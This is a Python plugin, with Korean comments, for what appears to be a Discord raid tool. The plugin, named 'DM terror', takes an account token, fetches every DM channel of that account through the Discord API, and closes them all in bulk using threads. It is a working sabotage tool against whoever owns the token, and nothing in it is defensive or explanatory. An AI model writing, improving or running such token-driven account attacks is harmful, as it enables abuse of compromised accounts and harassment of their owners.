import threading
import importlib

from colorama import Fore
import requests
    
from utils.Plugin.PluginABC import PluginABC
from utils.Setting.setup_most import TokenValidator, heads

# dm테러 기능을 사용하려면, 서버에 특정 토큰, 프록시로
# dm을 새로 생성할 때 만들어지는 요청을 제거해야됨.
# 그러면 토큰이랑 채널(디엠에도 채널 아이디가 있음)아이디를 얻어야 하는데, 이건 인자로 둘 것임

class DmBomber(PluginABC):
    plugin_name = "DM 테러"
    
    @classmethod
    def delete_all_dms(cls, token: str, channels: list[dict[str, str]]):
        for channel in channels:
            try:
                url = f"https://discord.com/api/v10/channels/{channel['id']}"
                requests.delete(url=url, headers=heads(token))
                print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] 삭제된 DM: {Fore.WHITE}{channel['id']}{Fore.RESET}")
            except Exception as e:
                print(f"\n\n오류! : {e}")
                
    @classmethod
    def dm_bomber(cls, token: str):
        threads: list[threading.Thread] = []
        channel_ids: list[str] = requests.get("https://discord.com/api/v10/users/@me/channels", headers=heads(token)).json()
        
        if not channel_ids:
            # Dm을 한 적이 없거나, 하고 나서 닫은 경우
            print(f"[\x1b[95m>\x1b[95m\x1B[37m] 해당 계정에는 현재 DM이 열려있지 않습니다!")
            return
        
        for channel_id in [channel_ids[i:i+3] for i in range(0, len(channel_ids), 3)]:
            thread = threading.Thread(target=cls.delete_all_dms, args=(token, channel_id))
            thread.start()
            threads.append(thread)
            
        for thread in threads:
            thread.join()
             
    @classmethod
    async def main(cls):
        option = super().get_option()
        
        if option == 1:
            token = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 토큰: ')
            TokenValidator(token)
            cls.dm_bomber(token=token)
            
            input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 엔터를 눌러주세요: ')
            await importlib.import_module("main").Hydron()
            
        else:
            await importlib.import_module("main").Hydron()